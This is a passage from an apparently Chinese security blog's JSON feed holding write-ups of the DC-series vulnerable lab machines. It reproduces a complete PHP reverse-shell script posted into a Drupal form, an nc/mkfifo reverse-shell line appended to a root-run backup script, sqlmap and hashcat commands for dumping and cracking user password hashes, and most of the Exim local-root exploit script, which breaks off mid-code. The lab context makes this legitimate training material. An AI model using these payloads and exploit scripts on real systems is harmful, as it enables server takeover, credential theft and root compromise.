{\n\t\texit(0);\n\t}\n\n\tif (posix_setsid() == -1) {\n\t\tprintit(&quot;Error: Can&#39;t setsid()&quot;);\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);\n}\n\nchdir(&quot;/&quot;);\numask(0);\n\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(&quot;$errstr ($errno)&quot;);\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),\n   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),\n   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(&quot;ERROR: Can&#39;t spawn shell&quot;);\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(&quot;Successfully opened reverse shell to $ip:$port&quot;);\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(&quot;ERROR: Shell connection terminated&quot;);\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(&quot;ERROR: Shell process terminated&quot;);\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(&quot;SOCK READ&quot;);\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(&quot;SOCK: $input&quot;);\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(&quot;STDOUT READ&quot;);\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(&quot;STDOUT: $input&quot;);\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(&quot;STDERR READ&quot;);\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(&quot;STDERR: $input&quot;);\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint &quot;$string\\n&quot;;\n\t}\n}\n?&gt;\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br></div></div><p><img src=\"/assets/img/15.png\" alt=\"img\" /></p>\n<p>kali 监听</p>\n<div><pre><code>nc -lvp 4444\n</code></pre>\n<div><span>1</span><br></div></div><p>点击save，成功回弹</p>\n<p><img src=\"/assets/img/16.png\" alt=\"img\" /></p>\n<h2 id=\"_0x04-提权\"> 0x04 提权</h2>\n<p>kali 监听</p>\n<div><pre><code>nc -lvp 6666\n</code></pre>\n<div><span>1</span><br></div></div><p>写入 payload</p>\n<div><pre><code>cd /opt/scripts/\necho &quot;mkfifo /tmp/bqro; nc 172.16.89.2 6666 0&lt;/tmp/bqro | /bin/sh &gt;/tmp/bqro 2&gt;&amp;1; rm /tmp/bqro&quot; &gt;&gt; /opt/scripts/backups.sh\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>等待回弹，获得root权限，/root/下拿到flag</p>\n<p><img src=\"/assets/img/image-20211005223842239.png\" alt=\"image-20211005223842239\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20211005210036930.png",
      "date_published": "2021-10-05T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC8-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc8/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc8/",
      "content_html": "<h2 id=\"_0x01-介绍\"> 0x01 介绍</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-8,367/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-8,367/</a></p>\n</blockquote>\n<p><strong>DESCRIPTION</strong></p>\n<p>DC-8 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>\n<p>This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</p>\n<p>The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</p>\n<p>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</p>\n<p>You probably wouldn't even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it's definitely there and doing it's job.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>nmap扫描ip</p>\n<div><pre><code>nmap -sP 172.16.89.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211006225232766.png\" alt=\"image-20211006225232766\" /></p>\n<p>发现ip：172.16.89.9，继续扫描</p>\n<div><pre><code>nmap -T5 -A -v -p- 172.16.89.9\n</code></pre>\n<div><span>1</span><br></div></div><p>扫描结果</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-06 22:54 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 22:54\nCompleted NSE at 22:54, 0.00s elapsed\nInitiating NSE at 22:54\nCompleted NSE at 22:54, 0.00s elapsed\nInitiating NSE at 22:54\nCompleted NSE at 22:54, 0.00s elapsed\nInitiating ARP Ping Scan at 22:54\nScanning 172.16.89.9 [1 port]\nCompleted ARP Ping Scan at 22:54, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 22:54\nCompleted Parallel DNS resolution of 1 host. at 22:54, 0.00s elapsed\nInitiating SYN Stealth Scan at 22:54\nScanning 172.16.89.9 [65535 ports]\nDiscovered open port 22/tcp on 172.16.89.9\nDiscovered open port 80/tcp on 172.16.89.9\nCompleted SYN Stealth Scan at 22:55, 5.53s elapsed (65535 total ports)\nInitiating Service scan at 22:55\nScanning 2 services on 172.16.89.9\nCompleted Service scan at 22:55, 6.04s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 172.16.89.9\nNSE: Script scanning 172.16.89.9.\nInitiating NSE at 22:55\nCompleted NSE at 22:55, 0.46s elapsed\nInitiating NSE at 22:55\nCompleted NSE at 22:55, 0.03s elapsed\nInitiating NSE at 22:55\nCompleted NSE at 22:55, 0.00s elapsed\nNmap scan report for 172.16.89.9\nHost is up (0.0013s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)\n| ssh-hostkey: \n|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)\n|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)\n|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)\n80/tcp open  http    Apache httpd\n|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03\n|_http-generator: Drupal 7 (http://drupal.org)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-robots.txt: 36 disallowed entries (15 shown)\n| /includes/ /misc/ /modules/ /profiles/ /scripts/ \n| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt \n| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt \n|_/LICENSE.txt /MAINTAINERS.txt\n|_http-server-header: Apache\n|_http-title: Welcome to DC-8 | DC-8\nMAC Address: 00:0C:29:E9:F7:C1 (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 199.639 days (since Sun Mar 21 07:35:43 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=262 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.30 ms 172.16.89.9\n\nNSE: Script Post-scanning.\nInitiating NSE at 22:55\nCompleted NSE at 22:55, 0.00s elapsed\nInitiating NSE at 22:55\nCompleted NSE at 22:55, 0.00s elapsed\nInitiating NSE at 22:55\nCompleted NSE at 22:55, 0.01s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.96 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br></div></div><p>发现两个端口，22和80</p>\n<h2 id=\"_0x03-渗透\"> 0x03 渗透</h2>\n<p>浏览器登录，目标站点使用Drupal搭建</p>\n<p><img src=\"/assets/img/image-20211006225718014.png\" alt=\"image-20211006225718014\" /></p>\n<p>扫描目录，发现登陆界面：http://172.16.89.9/user，其他一些配置文件没有什么用</p>\n<p>点击左侧连接发现存在参数nid</p>\n<div><pre><code>http://172.16.89.9/?nid=1\n</code></pre>\n<div><span>1</span><br></div></div><p>使用sqlmap扫描</p>\n<div><pre><code>sqlmap -u &quot;http://172.16.89.9/?nid=1&quot; --dbs\nsqlmap -u &quot;http://172.16.89.9/?nid=1&quot; -D d7db --tables\nsqlmap -u &quot;http://172.16.89.9/?nid=1&quot; -D d7db -T users --dump\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>发现admin和john密码hash</p>\n<div><pre><code>$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z\n$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>使用hashcat跑一下</p>\n<div><pre><code>echo &quot;\\$S\\$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z&quot; &gt; dc8_pass.txt\necho &quot;\\$S\\$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF&quot; &gt;&gt; dc8_pass.txt\nhashcat -m 7900 -a 0 dc8_pass.txt /usr/share/john/password.lst -o result.txt --show\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p><img src=\"/assets/img/image-20211006231522611.png\" alt=\"image-20211006231522611\" /></p>\n<p>跑出了john的密码turtle，在http://172.16.89.9/user下登陆，后台有一个设置php代码的地方</p>\n<p><img src=\"/assets/img/image-20211006233225903.png\" alt=\"image-20211006233225903\" /></p>\n<p>设置php回弹shell代码，在表单提交时触发</p>\n<div><pre><code>aaa\n<span><span>&lt;?php</span>\n\n<span>set_time_limit</span> <span>(</span><span>0</span><span>)</span><span>;</span>\n<span>$VERSION</span> <span>=</span> <span>\"1.0\"</span><span>;</span>\n<span>$ip</span> <span>=</span> <span>'172.16.89.2'</span><span>;</span>\n<span>$port</span> <span>=</span> <span>4444</span><span>;</span>\n<span>$chunk_size</span> <span>=</span> <span>1400</span><span>;</span>\n<span>$write_a</span> <span>=</span> <span>null</span><span>;</span>\n<span>$error_a</span> <span>=</span> <span>null</span><span>;</span>\n<span>$shell</span> <span>=</span> <span>'uname -a; w; id; /bin/sh -i'</span><span>;</span>\n<span>$daemon</span> <span>=</span> <span>0</span><span>;</span>\n<span>$debug</span> <span>=</span> <span>0</span><span>;</span>\n\n<span>if</span> <span>(</span><span>function_exists</span><span>(</span><span>'pcntl_fork'</span><span>)</span><span>)</span> <span>{</span>\n\t<span>// Fork and have the parent process exit</span>\n\t<span>$pid</span> <span>=</span> <span>pcntl_fork</span><span>(</span><span>)</span><span>;</span>\n\n\t<span>if</span> <span>(</span><span>$pid</span> <span>==</span> <span>-</span><span>1</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"ERROR: Can't fork\"</span><span>)</span><span>;</span>\n\t\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>if</span> <span>(</span><span>$pid</span><span>)</span> <span>{</span>\n\t\t<span>exit</span><span>(</span><span>0</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>if</span> <span>(</span><span>posix_setsid</span><span>(</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"Error: Can't setsid()\"</span><span>)</span><span>;</span>\n\t\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>$daemon</span> <span>=</span> <span>1</span><span>;</span>\n<span>}</span> <span>else</span> <span>{</span>\n\t<span>printit</span><span>(</span><span>\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>chdir</span><span>(</span><span>\"/\"</span><span>)</span><span>;</span>\n<span>umask</span><span>(</span><span>0</span><span>)</span><span>;</span>\n\n<span>$sock</span> <span>=</span> <span>fsockopen</span><span>(</span><span>$ip</span><span>,</span> <span>$port</span><span>,</span> <span>$errno</span><span>,</span> <span>$errstr</span><span>,</span> <span>30</span><span>)</span><span>;</span>\n<span>if</span> <span>(</span><span>!</span><span>$sock</span><span>)</span> <span>{</span>\n\t<span>printit</span><span>(</span><span>\"<span><span>$errstr</span></span> (<span><span>$errno</span></span>)\"</span><span>)</span><span>;</span>\n\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>$descriptorspec</span> <span>=</span> <span>array</span><span>(</span>\n   <span>0</span> <span>=></span> <span>array</span><span>(</span><span>\"pipe\"</span><span>,</span> <span>\"r\"</span><span>)</span><span>,</span>\n   <span>1</span> <span>=></span> <span>array</span><span>(</span><span>\"pipe\"</span><span>,</span> <span>\"w\"</span><span>)</span><span>,</span>\n   <span>2</span> <span>=></span> <span>array</span><span>(</span><span>\"pipe\"</span><span>,</span> <span>\"w\"</span><span>)</span>\n<span>)</span><span>;</span>\n\n<span>$process</span> <span>=</span> <span>proc_open</span><span>(</span><span>$shell</span><span>,</span> <span>$descriptorspec</span><span>,</span> <span>$pipes</span><span>)</span><span>;</span>\n\n<span>if</span> <span>(</span><span>!</span><span>is_resource</span><span>(</span><span>$process</span><span>)</span><span>)</span> <span>{</span>\n\t<span>printit</span><span>(</span><span>\"ERROR: Can't spawn shell\"</span><span>)</span><span>;</span>\n\t<span>exit</span><span>(</span><span>1</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>stream_set_blocking</span><span>(</span><span>$pipes</span><span>[</span><span>0</span><span>]</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n<span>stream_set_blocking</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n<span>stream_set_blocking</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n<span>stream_set_blocking</span><span>(</span><span>$sock</span><span>,</span> <span>0</span><span>)</span><span>;</span>\n\n<span>printit</span><span>(</span><span>\"Successfully opened reverse shell to <span><span>$ip</span></span>:<span><span>$port</span></span>\"</span><span>)</span><span>;</span>\n\n<span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>\n\t<span>if</span> <span>(</span><span>feof</span><span>(</span><span>$sock</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"ERROR: Shell connection terminated\"</span><span>)</span><span>;</span>\n\t\t<span>break</span><span>;</span>\n\t<span>}</span>\n\n\t<span>if</span> <span>(</span><span>feof</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>printit</span><span>(</span><span>\"ERROR: Shell process terminated\"</span><span>)</span><span>;</span>\n\t\t<span>break</span><span>;</span>\n\t<span>}</span>\n\n\t<span>$read_a</span> <span>=</span> <span>array</span><span>(</span><span>$sock</span><span>,</span> <span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>$pipes</span><span>[</span><span>2</span><span>]</span><span>)</span><span>;</span>\n\t<span>$num_changed_sockets</span> <span>=</span> <span>stream_select</span><span>(</span><span>$read_a</span><span>,</span> <span>$write_a</span><span>,</span> <span>$error_a</span><span>,</span> <span>null</span><span>)</span><span>;</span>\n\n\t<span>if</span> <span>(</span><span>in_array</span><span>(</span><span>$sock</span><span>,</span> <span>$read_a</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"SOCK READ\"</span><span>)</span><span>;</span>\n\t\t<span>$input</span> <span>=</span> <span>fread</span><span>(</span><span>$sock</span><span>,</span> <span>$chunk_size</span><span>)</span><span>;</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"SOCK: <span><span>$input</span></span>\"</span><span>)</span><span>;</span>\n\t\t<span>fwrite</span><span>(</span><span>$pipes</span><span>[</span><span>0</span><span>]</span><span>,</span> <span>$input</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>if</span> <span>(</span><span>in_array</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>$read_a</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDOUT READ\"</span><span>)</span><span>;</span>\n\t\t<span>$input</span> <span>=</span> <span>fread</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>,</span> <span>$chunk_size</span><span>)</span><span>;</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDOUT: <span><span>$input</span></span>\"</span><span>)</span><span>;</span>\n\t\t<span>fwrite</span><span>(</span><span>$sock</span><span>,</span> <span>$input</span><span>)</span><span>;</span>\n\t<span>}</span>\n\n\t<span>if</span> <span>(</span><span>in_array</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>,</span> <span>$read_a</span><span>)</span><span>)</span> <span>{</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDERR READ\"</span><span>)</span><span>;</span>\n\t\t<span>$input</span> <span>=</span> <span>fread</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>,</span> <span>$chunk_size</span><span>)</span><span>;</span>\n\t\t<span>if</span> <span>(</span><span>$debug</span><span>)</span> <span>printit</span><span>(</span><span>\"STDERR: <span><span>$input</span></span>\"</span><span>)</span><span>;</span>\n\t\t<span>fwrite</span><span>(</span><span>$sock</span><span>,</span> <span>$input</span><span>)</span><span>;</span>\n\t<span>}</span>\n<span>}</span>\n\n<span>fclose</span><span>(</span><span>$sock</span><span>)</span><span>;</span>\n<span>fclose</span><span>(</span><span>$pipes</span><span>[</span><span>0</span><span>]</span><span>)</span><span>;</span>\n<span>fclose</span><span>(</span><span>$pipes</span><span>[</span><span>1</span><span>]</span><span>)</span><span>;</span>\n<span>fclose</span><span>(</span><span>$pipes</span><span>[</span><span>2</span><span>]</span><span>)</span><span>;</span>\n<span>proc_close</span><span>(</span><span>$process</span><span>)</span><span>;</span>\n\n<span>function</span> <span>printit</span> <span>(</span><span>$string</span><span>)</span> <span>{</span>\n\t<span>if</span> <span>(</span><span>!</span><span>$daemon</span><span>)</span> <span>{</span>\n\t\t<span>print</span> <span>\"<span><span>$string</span></span>\\n\"</span><span>;</span>\n\t<span>}</span>\n<span>}</span>\n\n<span>?></span></span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br></div></div><p><img src=\"/assets/img/image-20211006233037731.png\" alt=\"image-20211006233037731\" /></p>\n<p>拿到回弹shell，升级交互shell</p>\n<div><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;\nexport TERM=xterm\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h2 id=\"_0x03-提权\"> 0x03 提权</h2>\n<p>尝试sudo -l需要密码，再尝试寻找suid文件</p>\n<div><pre><code>find / -perm -u=s 2&gt;/dev/null\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211006233721939.png\" alt=\"image-20211006233721939\" /></p>\n<p>发现exim4可以尝试利用</p>\n<div><pre><code>exim4 --version\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211006233944474.png\" alt=\"image-20211006233944474\" /></p>\n<div><pre><code> searchsploit -w exim 4.8\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211006234423610.png\" alt=\"image-20211006234423610\" /></p>\n<p>使用https://www.exploit-db.com/exploits/46996进行提权，在目标机保存poc并运行</p>\n<div><pre><code>\ntee pri<span>.</span>sh <span>&lt;&lt;</span><span>-</span><span>'EOF'</span>\n<span>METHOD</span><span>=</span><span>\"setuid\"</span> # <span>default</span> method\n<span>PAYLOAD_SETUID</span><span>=</span><span>'${run{\\x2fbin\\x2fsh\\t-c\\t\\x22chown\\troot\\t\\x2ftmp\\x2fpwned\\x3bchmod\\t4755\\t\\x2ftmp\\x2fpwned\\x22}}@localhost'</span>\n<span>PAYLOAD_NETCAT</span><span>=</span><span>'${run{\\x2fbin\\x2fsh\\t-c\\t\\x22nc\\t-lp\\t31337\\t-e\\t\\x2fbin\\x2fsh\\x22}}@localhost'</span>\n\n# usage instructions\n<span>function</span> <span>usage</span><span>(</span><span>)</span>\n<span>{</span>\n\techo <span>\"$0 [-m METHOD]\"</span>\n\texit <span>1</span>\n<span>}</span>\n\n<span>function</span> <span>exploit</span><span>(</span><span>)</span>\n<span>{</span>\n\texec <span>3</span><span>&lt;</span><span>></span><span>/</span>dev<span>/</span>tcp<span>/</span>localhost<span>/</span><span>25</span>\n\n\tread <span>-</span>u <span>3</span> <span>&amp;&amp;</span> echo $<span>REPLY</span>\n\techo <span>\"helo localhost\"</span> <span>></span><span>&amp;</span><span>3</span>\n\tread <span>-</span>u <span>3</span> <span>&amp;&amp;</span> echo $<span>REPLY</span>\n\techo <span>\"mail from:&lt;>\"</span> <span>></span><span>&amp;</span><span>3</span>\n\tread <span>-</span>u <span>3</span> <span>&amp;&amp;</span> echo $<span>REPLY</span>\n\techo <span>\"rcpt to:&lt;$PAYLOAD>\"</span> <span>></span><span>&amp;</span><span>3</span>\n\tread <span>-</span>u <span>3</span> <span>&amp;&amp;</span> echo $<span>REPLY</span>\n\techo <span>\"data\"</span> <span>></span><span>&amp;</span><span>3</span>\n\tread <span>-</span>u <span>3</span> <span>&amp;&amp;</span> echo $<span>REPLY</span>\n\t<span>for</span> i <span>in</span> <span>{</span><span>1.</span><span>.31</span><span>}</span>\n\t<span>do</span>\n\t\techo <span>\"Received: $i\"</span> <span>></span><span>&amp;</span><span>3</span>\n\tdone\n\techo <span>\".\"</span> <span>></span><span>&amp;</span><span>3</span>\n\tread <span>-</span>u <span>3</span> <span>&amp;&amp;</span> echo $<span>REPLY</span>\n\techo <span>\"quit\"</span> <span>></span><span>&amp;</span><span>3</span>\n\tread <span>-</span>u <span>3</span> <span>&amp;&amp;</span> echo $<span>REPLY</span>\n<span>}</span>\n\n<span>while</span> <span>[</span> <span>!</span> <span>-</span>z <span>\"$1\"</span> <span>]</span><span>;</span> <span>do</span>\n\t<span>case</span> $<span>1</span> <span>in</span>\n\t\t<span>-</span>m<span>)</span> shift<span>;</span> <span>METHOD</span><span>=</span><span>\"$1\"</span><span>;</span> shift<span>;</span><span>;</span>\n\t\t<span>*</span> <span>)</span> usage\n\t\t<span>;</span><span>;</span>\n\tesac\ndone\n<span>if</span> <span>[</span> <span>-</span>z $<span>METHOD</span> <span>]</span><span>;</span> then\n\tusage\nfi\n\n<span>if</span> <span>[</span> $<span>METHOD</span> <span>=</span> <span>\"setuid\"</span> <span>]</span><span>;</span> then\n\n\techo <span>\"Preparing setuid shell helper...\"</span>\n\techo <span>\"main(){setuid(0);setgid(0);system(\\\"/bin/sh\\\");}\"</span> 